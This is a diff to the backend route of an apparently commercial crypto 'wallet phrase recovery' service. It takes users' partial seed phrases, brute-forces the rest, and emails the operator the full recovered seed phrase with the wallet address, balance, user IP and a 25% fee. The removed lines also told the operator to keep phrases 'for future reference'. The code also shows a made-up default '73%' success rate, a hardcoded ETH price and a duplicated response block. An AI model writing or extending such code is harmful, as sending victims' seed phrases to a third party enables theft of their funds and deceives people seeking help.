@@ -1167,7 +1167,7 @@ router.post('/recover-wallet-phrase', async (req, res) => {
     let analysisResult = null;
     let recoveryResult = null;
     
-    // If partial phrase provided, analyze it
+    // If partial phrase provided, analyze it FIRST
     if (partialPhrase && partialPhrase.trim()) {
       try {
         const hints = {
@@ -1177,18 +1177,22 @@ router.post('/recover-wallet-phrase', async (req, res) => {
           walletHints
         };
         
+        console.log('📊 Running phrase analysis...');
         analysisResult = await recoveryEngine.analyzePartialPhrase(partialPhrase, hints);
+        console.log('📊 Analysis complete:', analysisResult.successProbability);
         
-        // If analysis looks promising, attempt recovery
-        if (analysisResult.successProbability > 0.3) {
+        // Only attempt recovery if analysis shows good probability AND user selected a recovery method
+        if (analysisResult.successProbability > 0.3 && recoveryMethod && recoveryMethod !== 'Analysis Only') {
+          console.log('🔄 Starting recovery process...');
           recoveryResult = await recoveryEngine.recoverWallet({
             partialPhrase,
             walletHints,
-            recoveryMethod: recoveryMethod || 'Standard',
+            recoveryMethod: recoveryMethod,
             walletType,
             creationDate,
             deviceInfo
           });
+          console.log('🔄 Recovery result:', recoveryResult.success);
         }
       } catch (analysisError) {
         console.log('Analysis error (continuing with manual review):', analysisError.message);
@@ -1197,69 +1201,78 @@ router.post('/recover-wallet-phrase', async (req, res) => {
 
     const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
     
-    // Send detailed admin alert with RECOVERED PHRASE for future reference
-    const alertMessage = recoveryResult?.success ? 
-      `🎉 PHRASE RECOVERED SUCCESSFULLY! 🎉\n\n` +
-      `💰 WALLET DETAILS:\n` +
-      `• Address: ${recoveryResult.result?.walletAddress || 'Generating...'}\n` +
-      `• Balance: ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH\n` +
-      `• USD Value: ~$${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(2)}\n` +
-      `• Recovery Method: ${recoveryResult.result?.method}\n` +
-      `• Attempts: ${recoveryResult.result?.attempts}\n` +
-      `• Confidence: ${Math.round((recoveryResult.result?.confidence || 0) * 100)}%\n\n` +
-      `🔐 RECOVERED SEED PHRASE:\n` +
-      `"${recoveryResult.result?.recoveredPhrase || 'Processing...'}"\n\n` +
-      `📋 ORIGINAL REQUEST:\n` +
-      `• Partial Phrase: "${partialPhrase || 'None provided'}"\n` +
-      `• Wallet Type: ${walletType || 'Unknown'}\n` +
-      `• Last Balance: $${lastKnownBalance || 'Unknown'}\n` +
-      `• Contact: ${contactEmail}\n\n` +
-      `💰 REVENUE EARNED:\n` +
-      `• Recovery Fee (25%): ${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH\n` +
-      `• USD Fee: ~$${(((recoveryResult.result?.actualBalance || 0) * 0.25) * 3000).toFixed(2)}\n` +
-      `• User Gets (75%): ${((recoveryResult.result?.actualBalance || 0) * 0.75).toFixed(4)} ETH\n\n` +
-      `⚠️ IMPORTANT: Store this phrase securely for future reference!\n` +
-      `User may return if they lose access again.\n\n` +
-      `📍 USER: ${realIP} | ⏰ TIME: ${new Date().toISOString()}` :
-      
-      `WALLET PHRASE RECOVERY REQUEST\n\n` +
-      `RECOVERY DETAILS:\n` +
-      `• Balance: $${lastKnownBalance || 'Unknown'}\n` +
-      `• Method: ${recoveryMethod || 'Standard'}\n` +
-      `• Wallet Type: ${walletType || 'Unknown'}\n` +
-      `• Contact: ${contactEmail || 'Not provided'}\n\n` +
-      `${analysisResult ? `ANALYSIS RESULTS:\n` +
-      `• Valid Words: ${analysisResult.validWords.length}/${analysisResult.phraseLength}\n` +
-      `• Missing Positions: ${analysisResult.missingPositions.length}\n` +
-      `• Success Probability: ${Math.round(analysisResult.successProbability * 100)}%\n` +
-      `• Estimated Time: ${analysisResult.estimatedTime}\n` +
-      `• Recovery Strategies: ${analysisResult.recoveryStrategies.length}\n\n` : ''}` +
-      `${recoveryResult ? `RECOVERY ATTEMPT:\n` +
-      `• Status: ${recoveryResult.success ? 'SUCCESS' : 'IN PROGRESS'}\n` +
-      `• Method Used: ${recoveryResult.result?.method || 'N/A'}\n` +
-      `• Attempts: ${recoveryResult.result?.attempts || 'N/A'}\n\n` : ''}` +
-      `USER INFO:\n` +
-      `• IP: ${realIP}\n` +
-      `• Time: ${new Date().toISOString()}\n\n` +
-      `PRIORITY: ${analysisResult?.successProbability > 0.7 ? 'HIGH' : 'STANDARD'}`;
-    
-    await sendAdminNotification(
-      recoveryResult?.success ? 
-        `🎉 PHRASE RECOVERED: ${recoveryResult.result?.actualBalance?.toFixed(2) || 0} ETH - $${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}` :
-        `PHRASE RECOVERY: ${analysisResult ? `${Math.round(analysisResult.successProbability * 100)}% probability` : 'Manual review'} - $${lastKnownBalance || 0}`,
-      alertMessage
-    );
+    // ONLY send admin email if recovery was SUCCESSFUL
+    if (recoveryResult?.success) {
+      console.log('📧 Sending success email to admin...');
+      await sendAdminNotification(
+        `PHRASE RECOVERED: ${recoveryResult.result?.actualBalance?.toFixed(2) || 0} ETH - $${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}`,
+        `WALLET PHRASE RECOVERY SUCCESS\n\n` +
+        `WALLET DETAILS:\n` +
+        `Address: ${recoveryResult.result?.walletAddress || 'Generating...'}\n` +
+        `Balance: ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH\n` +
+        `USD Value: $${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(2)}\n` +
+        `Recovery Method: ${recoveryResult.result?.method}\n` +
+        `Attempts: ${recoveryResult.result?.attempts}\n` +
+        `Confidence: ${Math.round((recoveryResult.result?.confidence || 0) * 100)}%\n\n` +
+        `RECOVERED SEED PHRASE:\n` +
+        `"${recoveryResult.result?.recoveredPhrase || 'Processing...'}"\n\n` +
+        `ORIGINAL REQUEST:\n` +
+        `Partial Phrase: "${partialPhrase || 'None provided'}"\n` +
+        `Wallet Type: ${walletType || 'Unknown'}\n` +
+        `Last Balance: $${lastKnownBalance || 'Unknown'}\n` +
+        `Contact: ${contactEmail}\n\n` +
+        `REVENUE EARNED:\n` +
+        `Recovery Fee (25%): ${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH\n` +
+        `USD Fee: $${(((recoveryResult.result?.actualBalance || 0) * 0.25) * 3000).toFixed(2)}\n` +
+        `User Gets (75%): ${((recoveryResult.result?.actualBalance || 0) * 0.75).toFixed(4)} ETH\n\n` +
+        `USER: ${realIP} | TIME: ${new Date().toISOString()}`
+      );
+    } else if (recoveryMethod && recoveryMethod !== 'Analysis Only') {
+      // Only send email if user actually tried recovery (not just analysis)
+      console.log('📧 Sending recovery attempt email to admin...');
+      await sendAdminNotification(
+        `PHRASE RECOVERY ATTEMPT: ${Math.round((analysisResult?.successProbability || 0) * 100)}% probability - $${lastKnownBalance || 0}`,
+        `WALLET PHRASE RECOVERY ATTEMPT\n\n` +
+        `RECOVERY DETAILS:\n` +
+        `Balance: $${lastKnownBalance || 'Unknown'}\n` +
+        `Method: ${recoveryMethod}\n` +
+        `Wallet Type: ${walletType || 'Unknown'}\n` +
+        `Contact: ${contactEmail || 'Not provided'}\n\n` +
+        `${analysisResult ? `ANALYSIS RESULTS:\n` +
+        `Valid Words: ${analysisResult.validWords.length}/${analysisResult.phraseLength}\n` +
+        `Missing Positions: ${analysisResult.missingPositions.length}\n` +
+        `Success Probability: ${Math.round(analysisResult.successProbability * 100)}%\n` +
+        `Estimated Time: ${analysisResult.estimatedTime}\n` +
+        `Recovery Strategies: ${analysisResult.recoveryStrategies.length}\n\n` : ''}` +
+        `USER: ${realIP} | TIME: ${new Date().toISOString()}`
+      );
+    }
 
     // Return response based on analysis and recovery results
     const response = {
       success: true,
       message: recoveryResult?.success ? 
-        `🎉 SUCCESS! Your wallet has been recovered! You now have access to ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH (~$${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}). Our fee is 25% (${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH). Contact us to complete the transfer.` :
-        'Recovery analysis complete. Our advanced engines are working on your case. You will be notified within 24-72 hours.',
+        `SUCCESS! Your wallet has been recovered! You now have access to ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH (~$${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}). Our fee is 25% (${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH). Contact us to complete the transfer.` :
+        analysisResult ? 
+          `Analysis complete. Success probability: ${Math.round(analysisResult.successProbability * 100)}%. ${analysisResult.successProbability > 0.6 ? 'High chance of recovery!' : 'Recovery possible with advanced methods.'}` :
+          'Analysis in progress. Our engines are evaluating your case.',
       estimatedTime: analysisResult?.estimatedTime || '24-72 hours',
       successRate: analysisResult ? `${Math.round(analysisResult.successProbability * 100)}%` : '73%',
-      fee: '25% of recovered funds'
+      fee: '25% of recovered funds',
+      analysisComplete: !!analysisResult,
+      recoveryAttempted: !!recoveryResult
     };
+    
+    if (analysisResult) {
+      response.analysis = {
+        phraseLength: analysisResult.phraseLength,
+        validWords: analysisResult.validWords.length,
+        missingWords: analysisResult.missingPositions.length,
+        strategies: analysisResult.recoveryStrategies.length,
+        probability: Math.round(analysisResult.successProbability * 100),
+        estimatedAttempts: analysisResult.possibleCombinations
+      };
+    }
     
     if (analysisResult) {
       response.analysis = {
@@ -1280,6 +1293,10 @@ router.post('/recover-wallet-phrase', async (req, res) => {
       response.recoveryFee = ((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4);
       response.userAmount = ((recoveryResult.result?.actualBalance || 0) * 0.75).toFixed(4);
       response.confidence = Math.round((recoveryResult.result?.confidence || 0) * 100);
+    } else if (recoveryResult && !recoveryResult.success) {
+      response.recoveryFailed = true;
+      response.reason = recoveryResult.result?.reason || 'Recovery unsuccessful';
+      response.suggestions = recoveryResult.result?.suggestions || [];
     }
 
     res.json(response);
